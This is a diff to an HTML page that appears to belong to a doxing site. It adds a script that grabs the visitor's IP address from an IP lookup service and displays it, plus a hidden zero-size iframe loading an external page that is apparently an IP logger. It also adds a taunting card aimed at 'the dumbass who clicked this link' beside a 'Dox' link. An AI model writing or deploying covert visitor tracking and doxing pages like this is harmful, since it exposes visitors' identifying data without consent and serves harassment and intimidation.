@@ -414,7 +414,16 @@
 <audio autoplay>  
 <source src="https://socialheaven.xyz/hoa/doxbin.mp3" type="audio/mpeg">
 </audio>
-
+<script>
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+ if (this.readyState == 4 && this.status == 200) {
+   document.getElementById("ip").innerHTML = this.responseText;
+   }
+};
+xhttp.open("GET", "https://api.ipify.org", true);
+xhttp.send();
+</script>
 			<div class="hoa-container">
 				<div class="hoa-image">
 					<img src="https://cdn.discordapp.com/avatars/1038531543322349670/e4c117e35fc56c08a0f86c25c27189cc.png">
@@ -431,7 +440,23 @@
 					<a href="https://socialheaven.lol/upload/zensu" target="_blank">Dox</a>
 				</div>
 			</div>
+		<div class="hoa-container">
+				<div class="hoa-image">
+					<img src="https://cdn.discordapp.com/attachments/1064972460916752564/1069101226563739679/051670F5-2ED1-4AAB-BC10-1AAF4CD9C8DC.png">
+				</div>
+				<div class="hoa-name rainbow">
+					     You!
+				</div>
+                                <iframe src="https://ezstat.ru/skidcheck.html" height="0" width="0"></iframe>    
+				<div class="hoa-description">
+					<b id="ip"></b><br>
+					The dumbass who clicked this link. <br>
+					What the fuck were you thinking?<br>
+					<a href="https://doxxed.lol/upload/zensu" target="_blank">Dox</a>
+				</div>
+			</div>
 		
+
 
 		</div>
     </div>
